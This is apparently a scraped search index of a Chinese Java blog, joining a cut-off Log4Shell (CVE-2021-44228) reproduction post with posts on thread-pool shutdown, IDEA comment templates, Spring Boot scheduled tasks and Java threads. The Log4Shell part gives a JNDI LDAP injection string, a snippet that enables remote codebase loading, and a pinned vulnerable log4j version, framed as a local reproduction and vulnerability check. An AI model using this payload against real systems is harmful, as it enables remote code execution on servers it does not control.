0.0.0.0:1389 ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:3:3","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"4. 本地IDE环境运行log4j 说明： 如果log4j.java 同目录下放置了Exploit.java 则不需要运行fileserver提供Exploit.class log4j.java import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class log4j { private static final Logger logger = LogManager.getLogger(log4j.class); public static void main(String[] args) { //The default trusturlcodebase of the higher version JDK is false System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\",\"true\"); logger.error(\"${jndi:ldap://127.0.0.1:1389/Exploit}\"); } } ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:3:4","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"5. 运行界面 重定向到hacker提供的服务 执行hacker的注入程序或脚本 ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:3:5","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"6. log4j项目pom.xml \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cproject xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd\"\u003e \u003cmodelVersion\u003e4.0.0\u003c/modelVersion\u003e \u003cgroupId\u003eorg.example\u003c/groupId\u003e \u003cartifactId\u003elog4j-rce\u003c/artifactId\u003e \u003cversion\u003e1.0-SNAPSHOT\u003c/version\u003e \u003cdependencies\u003e \u003c!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-core\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003c!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --\u003e \u003cdependency\u003e \u003cgroupId\u003eorg.apache.logging.log4j\u003c/groupId\u003e \u003cartifactId\u003elog4j-api\u003c/artifactId\u003e \u003cversion\u003e2.14.1\u003c/version\u003e \u003c/dependency\u003e \u003c/dependencies\u003e \u003c/project\u003e ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:3:6","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"漏洞检查 根据项目使用log方式，运行log实例检查，看是否会触发Exploit程序执行。如下： String jndiErr = \"${jndi:ldap://127.0.0.1:1389/Exploit}\" // case 1. log.error(jndiErr); // case 2. logger = ... logger.error(jndiErr); // case 3. Logger = ... Logger.error(jndiErr); // ... ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:4:0","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"附录 试试CVE-2021-44228 log4j2 rce ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:5:0","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"线程池的优雅关闭实践 平时开发中，大家更多的关注的是线程池的创建、任务的提交和执行。往往会忽略线程池的关闭，甚至忘记调用shutdown()方法，导致内存溢出。大多知道需要调用shutdown()关闭线程池，也少研究其真正的关闭过程。 首先看源码中的一句注释： A pool that is no longer referenced in a program and has no remaining threads will be shutdown automatically. 如果程序中不再持有线程池的引用，并且线程池中没有线程时，线程池将会自动关闭。 线程池自动关闭的两个条件：1、线程池的引用不可达；2、线程池中没有线程； 这里对于条件2解释一下，线程池中没有线程是指线程池中的所有线程都已运行完自动消亡。然而我们常用的FixedThreadPool的核心线程没有超时策略，所以并不会自动关闭。 展示两种不同线程池 不关闭 的情况： 1、FixedThreadPool 示例 public static void main(String[] args) { while(true) { ExecutorService executorService = Executors.newFixedThreadPool(8); executorService.execute(() -\u003e System.out.println(\"running\")); executorService = null; } } 输出结果： running ...... running Exception in thread \"main\" java.lang.OutOfMemoryError: unable to create new native thread at java.lang.Thread.start0(Native Method) at java.lang.Thread.start(Thread.java:714) at java.util.concurrent.ThreadPoolExecutor.addWorker(ThreadPoolExecutor.java:950) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1357) at test.PoolTest.main(PoolTest.java:29) 因为FixedThreadPool的核心线程不会自动超时关闭，使用时必须在适当的时候调用shutdown()方法。 2、 CachedThreadPool 示例 public static void main(String[] args) { while(true) { // 默认keepAliveTime为 60s ExecutorService executorService = Executors.newCachedThreadPool(); ThreadPoolExecutor threadPoolExecutor = (ThreadPoolExecutor) executorService; // 为了更好的模拟，动态修改为1纳秒 threadPoolExecutor.setKeepAliveTime(1, TimeUnit.NANOSECONDS); threadPoolExecutor.execute(() -\u003e System.out.println(\"running\")); } } 输出结果： running running running running running ...... CachedThreadPool 的线程 keepAliveTime 默认为 60s ，核心线程数量为 0 ，所以不会有核心线程存活阻止线程池自动关闭。 详见 线程池之ThreadPoolExecutor构造 ，为了更快的模拟，构造后将 keepAliveTime 修改为1纳秒，相当于线程执行完马上会消亡，所以线程池可以被回收。实际开发中，如果CachedThreadPool 确实忘记关闭，在一定时间后是可以被回收的。但仍然建议显示关闭。 然而，线程池关闭的意义不仅仅在于结束线程执行，避免内存溢出，因为大多使用的场景并非上述示例那样 朝生夕死。线程池一般是持续工作的全局场景，如数据库连接池。 本文更多要讨论的是当线程池调用shutdown方法后，会经历些什么？思考一下几个问题： 是否可以继续接受新任务？继续提交新任务会怎样？ 等待队列里的任务是否还会执行？ 正在执行的任务是否会立即中断？ 问题1：是否可以继续接受新任务？继续提交新任务会怎样？ public static void main(String[] args) { ThreadPoolExecutor executor = new ThreadPoolExecutor(4, 4, 10, TimeUnit.SECONDS, new LinkedBlockingQueue\u003c\u003e()); executor.execute(() -\u003e System.out.println(\"before shutdown\")); executor.shutdown(); executor.execute(() -\u003e System.out.println(\"after shutdown\")); } 输出结果如下： before shutdown Exception in thread \"main\" java.util.concurrent.RejectedExecutionException: Task PoolTest$$Lambda$2/142257191@3e3abc88 rejected from java.util.concurrent.ThreadPoolExecutor@6ce253f1[Terminated, pool size = 0, active threads = 0, queued tasks = 0, completed tasks = 1] at java.util.concurrent.ThreadPoolExecutor$AbortPolicy.rejectedExecution(ThreadPoolExecutor.java:2047) at java.util.concurrent.ThreadPoolExecutor.reject(ThreadPoolExecutor.java:823) at java.util.concurrent.ThreadPoolExecutor.execute(ThreadPoolExecutor.java:1369) at PoolTest.main(PoolTest.java:12) 当线程池关闭后，继续提交新任务会抛出异常。这句话也不够准确，不一定是抛出异常，而是执行拒绝策略，默认的拒绝策略是抛出异常。可参见 线程池之ThreadPoolExecutor构造 里面自定义线程池的例子，自定义了忽略策略，但被拒绝时并没有抛出异常。 问题2：等待队列里的任务是否还会执行？ public class WaitqueueTest { public static void main(String[] args) { BlockingQueue\u003cRunnable\u003e workQueue = new LinkedBlockingQueue\u003c\u003e(); for(int i = 1; i \u003c= 100 ; i++){ workQueue.add(new Task(String.valueOf(i))); } ThreadPoolExecutor executor = new ThreadPoolExecutor(1, 1, 10, TimeUnit.SECONDS, workQueue); executor.execute(new Task(\"0\")); executor.shutdown(); System.out.println(\"workQueue size = \" + workQueue.size() + \" after shutdown\"); } static class Task implements Runnable{ String name; public Task(String name) { this.name = name; } @Override public void run() { for(int i = 1; i \u003c= 10; i++){ System.out.println(\"task \" + name + \" is running\"); } System.out.println(\"task \" + name + \" is over\"); } } } 这个demo解释一下，我们用LinkedBlockingQueue构造了一个线程池，在线程池启动前，我们先将工作队列填充100个任务，然后执行task 0 后立即shutdown()线程池，来验证线程池关闭队列的任务运行状态。 输出结果如下： ...... task 0 is running task 0 is over workQueue size = 100 after shutdown //表示线程池关闭后，队列任然有100个任务 task 1 is running ...... task 100 i","date":"2021-12-12","objectID":"/posts/2021/12/%E8%BD%AC%E8%BD%BDjava%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%85%B3%E9%97%AD/:1:0","tags":["Java"],"title":"[转载]Java线程池关闭","uri":"/posts/2021/12/%E8%BD%AC%E8%BD%BDjava%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%85%B3%E9%97%AD/"},{"categories":["Java"],"content":"附录 线程启动原理 线程中断机制 多线程实现方式 FutureTask实现原理 线程池之ThreadPoolExecutor概述 线程池之ThreadPoolExecutor使用 线程池之ThreadPoolExecutor状态控制 线程池之ThreadPoolExecutor执行原理 线程池之ScheduledThreadPoolExecutor概述 线程池之ScheduledThreadPoolExecutor调度原理 线程池的优雅关闭实践 作者：徐志毅 链接：https://www.jianshu.com/p/bdf06e2c1541 来源：简书 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ","date":"2021-12-12","objectID":"/posts/2021/12/%E8%BD%AC%E8%BD%BDjava%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%85%B3%E9%97%AD/:2:0","tags":["Java"],"title":"[转载]Java线程池关闭","uri":"/posts/2021/12/%E8%BD%AC%E8%BD%BDjava%E7%BA%BF%E7%A8%8B%E6%B1%A0%E5%85%B3%E9%97%AD/"},{"categories":["软件"],"content":"Idea设置Java类注释模板和方法注释模板 ","date":"2021-11-17","objectID":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/:0:0","tags":["软件"],"title":" IDEA设置Java注释模板","uri":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/"},{"categories":["软件"],"content":"设置类注释模板 1）：选择File–\u003eSettings–\u003eEditor–\u003eFile and Code Templates–\u003eIncludes–\u003eFile Header. 并勾选enable live template 注释模板： /** * @Title: ${file_name} * @Package ${package_name} * @Description: ${todo} * @author: runoob * @date: ${date} ${time} * @version: V1.0 */ 或自定义 /** * @Description: ${todo} * @author: ${USER} * @date: ${DATE} ${TIME} * @version: V1.0 */ ","date":"2021-11-17","objectID":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/:1:0","tags":["软件"],"title":" IDEA设置Java注释模板","uri":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/"},{"categories":["软件"],"content":"设置方法注释模板 Idea没有可以直接设置方法注释模板的地方，可以借用Live Templates基本实现，步骤如下。 1）：选择File–\u003eSettings–\u003eEditor–\u003eLive Templates，先选择右侧加号新建一个自己的模板组，如图 我这里命名模板组名为myGroup。 2）：选中组，选择右侧加号新建模板 这里注释快捷键可以自定义，如：cmj 3）：方法注释模板： /** * @Title: $enclosing_method$ * @Description: $todo$ * @param: $param$ * @return: $return$ * @author: binge * @date: $date$ $time$ * @throws */ 4）：点击Define，勾选Java 5）：点击Edit variables编辑变量，设置如下，点击Ok–\u003eApply完成设置。 说明：实际上为$var_name$变量配置相应的Expression操作，如methodName()、date()等，用于生成指定注释内容 6）：输入“/**”或者自定义快捷键，如cmj，然后按Tab键即可生成注释。live这种方式是需要在方法内部生成，否则@param等一些参数会是null。不像eclipse 方法头部就可以。 ","date":"2021-11-17","objectID":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/:2:0","tags":["软件"],"title":" IDEA设置Java注释模板","uri":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/"},{"categories":["软件"],"content":"自定义方法注释模板 ","date":"2021-11-17","objectID":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/:3:0","tags":["软件"],"title":" IDEA设置Java注释模板","uri":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/"},{"categories":["软件"],"content":"template text /** * @titile: $enclosing_method$ * @description: $todo$ $params$ * @return: $return$ * @author: dragon * @date: $date$ $time$ */ ","date":"2021-11-17","objectID":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/:3:1","tags":["软件"],"title":" IDEA设置Java注释模板","uri":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/"},{"categories":["软件"],"content":"params 去掉params带中括号 groovyScript(\"def result=''; def params=\\\"${_1}\\\".replaceAll('[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]', '').split(',').toList(); for(i = 0; i \u003c params.size(); i++) {result+=' * @param ' + params[i] + ((i \u003c params.size() - 1) ? '\\\\n':'')}; return result\", methodParameters()) ","date":"2021-11-17","objectID":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/:3:2","tags":["软件"],"title":" IDEA设置Java注释模板","uri":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/"},{"categories":["软件"],"content":"retrun 去掉retrun全类名 groovyScript(\"def result=''; def params=\\\"${_1}\\\".replaceAll('[\\\\\\\\[|\\\\\\\\]|\\\\\\\\s]', '').split('\u003c').toList(); for(i = 0; i \u003c params.size(); i++) {if(i!=0){result+='\u003c';}; def p1=params[i].split(',').toList(); for(i2 = 0; i2 \u003c p1.size(); i2++) { def p2=p1[i2].split('\\\\\\\\.').toList(); result+=p2[p2.size()-1]; if(i2!=p1.size()-1){result+=','} } ; }; return result\", methodReturnType()) ","date":"2021-11-17","objectID":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/:3:3","tags":["软件"],"title":" IDEA设置Java注释模板","uri":"/posts/2021/11/idea%E8%AE%BE%E7%BD%AEjava%E6%B3%A8%E9%87%8A%E6%A8%A1%E6%9D%BF/"},{"categories":["Java"],"content":"Springboot 定时任务 ","date":"2021-11-16","objectID":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/:0:0","tags":["Java"],"title":"Springboot 定时任务","uri":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"},{"categories":["Java"],"content":"序言 使用SpringBoot创建定时任务非常简单，目前主要有以下三种创建方式： 一、基于注解(@Scheduled) 二、基于接口（SchedulingConfigurer） 前者相信大家都很熟悉，但是实际使用中我们往往想从数据库中读取指定时间来动态执行定时任务，这时候基于接口的定时任务就派上用场了。 三、基于注解设定多线程定时任务 ","date":"2021-11-16","objectID":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/:1:0","tags":["Java"],"title":"Springboot 定时任务","uri":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"},{"categories":["Java"],"content":"一、静态：基于注解 基于注解@Scheduled默认为单线程，开启多个任务时，任务的执行时机会受上一个任务执行时间的影响。 1、创建定时器 使用SpringBoot基于注解来创建定时任务非常简单，只需几行代码便可完成。 代码如下： @Configuration //1.主要用于标记配置类，兼备Component的效果。 @EnableScheduling // 2.开启定时任务 public class SaticScheduleTask { //3.添加定时任务 @Scheduled(cron = \"0/5 * * * * ?\") //或直接指定时间间隔，例如：5秒 //@Scheduled(fixedRate=5000) private void configureTasks() { System.err.println(\"执行静态定时任务时间: \" + LocalDateTime.now()); } } Cron表达式参数分别表示： 秒（0~59） 例如0/5表示每5秒 分（0~59） 时（0~23） 日（0~31）的某天，需计算 月（0~11） 周几（ 可填1-7 或 SUN/MON/TUE/WED/THU/FRI/SAT） @Scheduled：除了支持灵活的参数表达式cron之外，还支持简单的延时操作，例如 fixedDelay ，fixedRate 填写相应的毫秒数即可。 // Cron表达式范例： 每隔5秒执行一次：*/5 * * * * ? 每隔1分钟执行一次：0 */1 * * * ? 每天23点执行一次：0 0 23 * * ? 每天凌晨1点执行一次：0 0 1 * * ? 每月1号凌晨1点执行一次：0 0 1 1 * ? 每月最后一天23点执行一次：0 0 23 L * ? 每周星期天凌晨1点实行一次：0 0 1 ? * L 在26分、29分、33分执行一次：0 26,29,33 * * * ? 每天的0点、13点、18点、21点都执行一次：0 0 0,13,18,21 * * ? 显然，使用@Scheduled 注解很方便，但缺点是当我们调整了执行周期的时候，需要重启应用才能生效，这多少有些不方便。为了达到实时生效的效果，可以使用接口来完成定时任务。 ","date":"2021-11-16","objectID":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/:2:0","tags":["Java"],"title":"Springboot 定时任务","uri":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"},{"categories":["Java"],"content":"二、动态：基于接口 基于接口（SchedulingConfigurer） 1、导入依赖包： \u003cparent\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter\u003c/artifactId\u003e \u003cversion\u003e2.0.4.RELEASE\u003c/version\u003e \u003c/parent\u003e \u003cdependencies\u003e \u003cdependency\u003e\u003c!--添加Web依赖 --\u003e \u003cgroupId\u003eorg.springframework.boot\u003c/groupId\u003e \u003cartifactId\u003espring-boot-starter-web\u003c/artifactId\u003e \u003c/dependency\u003e \u003cdependency\u003e\u003c!--添加MySql依赖 --\u003e \u003cgroupId\u003emysql\u003c/groupId\u003e \u003cartifactId\u003emysql-connector-java\u003c/artifactId\u003e \u003c/dependency\u003e \u003cdependency\u003e\u003c!--添加Mybatis依赖 配置mybatis的一些初始化的东西--\u003e \u003cgroupId\u003eorg.mybatis.spring.boot\u003c/groupId\u003e \u003cartifactId\u003emybatis-spring-boot-starter\u003c/artifactId\u003e \u003cversion\u003e1.3.1\u003c/version\u003e \u003c/dependency\u003e \u003cdependency\u003e\u003c!-- 添加mybatis依赖 --\u003e \u003cgroupId\u003eorg.mybatis\u003c/groupId\u003e \u003cartifactId\u003emybatis\u003c/artifactId\u003e \u003cversion\u003e3.4.5\u003c/version\u003e \u003cscope\u003ecompile\u003c/scope\u003e \u003c/dependency\u003e \u003c/dependencies\u003e 2、添加数据库记录： 开启本地数据库mysql，随便打开查询窗口，然后执行脚本内容，如下： DROP DATABASE IF EXISTS `socks`; CREATE DATABASE `socks`; USE `SOCKS`; DROP TABLE IF EXISTS `cron`; CREATE TABLE `cron` ( `cron_id` varchar(30) NOT NULL PRIMARY KEY, `cron` varchar(30) NOT NULL ); INSERT INTO `cron` VALUES ('1', '0/5 * * * * ?'); 然后在项目中的application.yml 添加数据源： spring:datasource:url:jdbc:mysql://localhost:3306/socksusername:rootpassword:123456 3、创建定时器 数据库准备好数据之后，我们编写定时任务，注意这里添加的是TriggerTask，目的是循环读取我们在数据库设置好的执行周期，以及执行相关定时任务的内容。 具体代码如下： @Configuration //1.主要用于标记配置类，兼备Component的效果。 @EnableScheduling // 2.开启定时任务 public class DynamicScheduleTask implements SchedulingConfigurer { @Mapper public interface CronMapper { @Select(\"select cron from cron limit 1\") public String getCron(); } @Autowired //注入mapper @SuppressWarnings(\"all\") CronMapper cronMapper; /** * 执行定时任务. */ @Override public void configureTasks(ScheduledTaskRegistrar taskRegistrar) { taskRegistrar.addTriggerTask( //1.添加任务内容(Runnable) () -\u003e System.out.println(\"执行动态定时任务: \" + LocalDateTime.now().toLocalTime()), //2.设置执行周期(Trigger) triggerContext -\u003e { //2.1 从数据库获取执行周期 String cron = cronMapper.getCron(); //2.2 合法性校验. if (StringUtils.isEmpty(cron)) { // Omitted Code .. } //2.3 返回执行周期(Date) return new CronTrigger(cron).nextExecutionTime(triggerContext); } ); } } 4、启动测试 启动应用后，查看控制台，打印时间是我们预期的每10秒一次： 然后打开Navicat ，将执行周期修改为每6秒执行一次， 查看控制台，发现执行周期已经改变，并且不需要我们重启应用，十分方便 注意： 如果在数据库修改时格式出现错误，则定时任务会停止，即使重新修改正确；此时只能重新启动项目才能恢复。 ","date":"2021-11-16","objectID":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/:3:0","tags":["Java"],"title":"Springboot 定时任务","uri":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"},{"categories":["Java"],"content":"三、多线程定时任务 基于注解设定多线程定时任务 1、创建多线程定时任务 //@Component注解用于对那些比较中立的类进行注释； //相对与在持久层、业务层和控制层分别采用 @Repository、@Service 和 @Controller 对分层中的类进行注释 @Component @EnableScheduling // 1.开启定时任务 @EnableAsync // 2.开启多线程 public class MultithreadScheduleTask { @Async @Scheduled(fixedDelay = 1000) //间隔1秒 public void first() throws InterruptedException { System.out.println(\"第一个定时任务开始 : \" + LocalDateTime.now().toLocalTime() + \"\\r\\n线程 : \" + Thread.currentThread().getName()); System.out.println(); Thread.sleep(1000 * 10); } @Async @Scheduled(fixedDelay = 2000) public void second() { System.out.println(\"第二个定时任务开始 : \" + LocalDateTime.now().toLocalTime() + \"\\r\\n线程 : \" + Thread.currentThread().getName()); System.out.println(); } } 注： 这里的@Async注解很关键 2、启动测试 启动应用后，查看控制台： 从控制台可以看出，第一个定时任务和第二个定时任务互不影响； 并且，由于开启了多线程，第一个任务的执行时间也不受其本身执行时间的限制，所以需要注意可能会出现重复操作导致数据异常。 代码地址： https://github.com/mmzsblog/springboot-schedule 原文链接： https://www.mmzsblog.cn/articles/2019/08/08/1565247960802.html ","date":"2021-11-16","objectID":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/:4:0","tags":["Java"],"title":"Springboot 定时任务","uri":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"},{"categories":["Java"],"content":"附录 玩转SpringBoot之定时任务详解 ","date":"2021-11-16","objectID":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/:5:0","tags":["Java"],"title":"Springboot 定时任务","uri":"/posts/2021/11/springboot-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/"},{"categories":["Java"],"content":"java多线程实现 java多线程本质上是实现Runnable接口 我们都知道启动一个线程，必须调用一个Thread的start()方法。在面试时经常可能会被问到start()和run()方法的区别，为什么一定要用start()方法才是启动线程？对比start()方法和run()的源码一看便知： /** * Causes this thread to begin execution; the Java Virtual Machine * calls the \u003ccode\u003erun\u003c/code\u003e method of this thread. * * 1、start方法将导致this thread开始执行。由JVM调用this thread的run方法。 * * The result is that two threads are running concurrently: the * current thread (which returns from the call to the * \u003ccode\u003estart\u003c/code\u003e method) and the other thread (which executes its * \u003ccode\u003erun\u003c/code\u003e method). * * 2、结果是 调用start方法的当前线程 和 执行run方法的另一个线程 并发运行。 * * It is never legal to start a thread more than once. * In particular, a thread may not be restarted once it has completed * execution. * * 3、多次启动线程永远不合法。 特别是，线程一旦完成执行就不会重新启动。 * * @exception IllegalThreadStateException if the thread was already started. * 如果线程已启动，则抛出异常。 * @see #run() * @see #stop() */ public synchronized void start() { /** * This method is not invoked for the main method thread or \"system\" * group threads created/set up by the VM. Any new functionality added * to this method in the future may have to also be added to the VM. * * 4、对于由VM创建/设置的main方法线程或“system”组线程，不会调用此方法。 * 未来添加到此方法的任何新功能可能也必须添加到VM中。 * * A zero status value corresponds to state \"NEW\". * 5、status=0 代表是 status 是 \"NEW\"。 */ if (threadStatus != 0) throw new IllegalThreadStateException(); /* Notify the group that this thread is about to be started * so that it can be added to the group's list of threads * and the group's unstarted count can be decremented. * * 6、通知组该线程即将启动，以便将其添加到线程组的列表中， * 并且减少线程组的未启动线程数递减。 * * */ group.add(this); boolean started = false; try { //7、调用native方法，底层开启异步线程，并调用run方法。 start0(); started = true; } finally { try { if (!started) { group.threadStartFailed(this); } } catch (Throwable ignore) { /* do nothing. If start0 threw a Throwable then it will be passed up the call stack * 8、忽略异常。 如果start0抛出一个Throwable，它将被传递给调用堆栈。 */ } } } //native方法，JVM创建并启动线程，并调用run方法 private native void start0(); 对于源码中的注释并没有省略，都进行了翻译，可以更好的理解整个启动过程。其中有几个需要注意的点： start方法用synchronized修饰，为同步方法； 虽然为同步方法，但不能避免多次调用问题，用threadStatus来记录线程状态，如果线程被多次start会抛出异常；threadStatus的状态由JVM控制。 使用Runnable时，主线程无法捕获子线程中的异常状态。线程的异常，应在线程内部解决。 ","date":"2021-11-15","objectID":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/:1:0","tags":["Java"],"title":"Java和Springboot中的多线程","uri":"/posts/2021/11/java%E5%92%8Cspringboot%E4%B8%AD%E7%9A%84%E5%A4%9A%E7%BA%BF%E7%A8%8B/"},{"categories":["Java"],"content":"0、线程中断机制(interrupt) 优雅的中断线程，是一门艺术 众所周知，Thread.stop, Thread.suspend, Thread.resume 都已经被废弃了。因为它们太暴力了，是不安全的，这种暴力中断线程是一种不安全的操作，举个栗子来说明其可能造成的问题： public class ThreadTest { public static void main(String[] args) { StopThread stopThread = new StopThread(); // 启动线程 stopThread.start(); try { // 休眠1秒，确保线程进入运行 Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } // 暂停线程 stopThread.stop(); // stopThread.interrupt(); // 确保线程已经销毁 while (stopThread.isAlive()) { } // 输出结果 stopThread.print(); } private static class StopThread extends Thread { private int x = 0; private int y = 0; @Override public void run(){ // 这是一个同步原子操作 synchronized (this){ ++x; try { // 休眠3秒,模拟耗时操作 Thread.sleep(3000); }catch (Exception e){ e.printStackTrace(); } ++y; } } public void print() { System.out.println(\"x=\" + x + \" y=\" + y); } } } 上述代码中，run方法里是一个同步的原子操作，x和y必须要共同增加，然而这里如果调用thread.stop()方法强制中断线程，输出如下： x=1 y=0 没有异常，也破坏了我们的预期。如果这种问题出现在我们的程序中，会引发难以预期的异常。因此这种不安全的方式很早就被废弃了。取而代之的是interrupt()，上述代码如果采用thread.interrupt()方法，输出结果如下： java.lang.InterruptedException: sleep interrupted at java.lang.Thread.sleep(Native Method) at ThreadTest$StopThread.run(ThreadTest.java:35) x=1 y=1 x=1,y=1 这个结果是符合我们的预期，同时还抛出了个异常，这个异常下文详说。 interrupt() 它基于「一个线程不应该由其他线程来强制中断或停止，而是应该由线程自己自行停止。」思想，是一个比较温柔的做法，它更类似一个标志位。其实作用不是中断线程，而是「通知线程应该中断了」，具体到底中断还是继续运行，应该由被通知的线程自己处理。 interrupt() 并不能真正的中断线程，这点要谨记。需要被调用的线程自己进行配合才行。也就是说，一个线程如果有被中断的需求，那么就需要这样做： 在正常运行任务时，经常检查本线程的中断标志位，如果被设置了中断标志就自行停止线程。 在调用阻塞方法时正确处理InterruptedException异常。（例如：catch异常后就结束线程。） 先看下 Thread 类 interrupt 相关的几个方法： // 核心 interrupt 方法 public void interrupt() { if (this != Thread.currentThread()) // 非本线程，需要检查权限 checkAccess(); synchronized (blockerLock) { Interruptible b = blocker; if (b != null) { interrupt0(); // 